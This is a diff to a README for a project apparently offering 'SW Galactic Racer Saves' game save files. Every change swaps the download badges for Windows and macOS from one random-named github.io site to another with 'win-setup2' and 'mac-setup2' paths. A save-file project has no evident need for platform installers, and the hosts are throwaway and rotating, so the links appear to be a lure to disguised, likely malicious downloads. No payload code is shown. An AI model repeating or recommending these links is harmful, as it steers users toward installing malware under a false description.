@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download SW Galactic Racer Saves](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SW_GALACTIC_RACER_SAVES-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download SW Galactic Racer Saves](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SW_GALACTIC_RACER_SAVES-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **SW Galactic Racer Saves** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-FFD600?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-FFD600?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-FFD600?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-FFD600?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 </div>
 
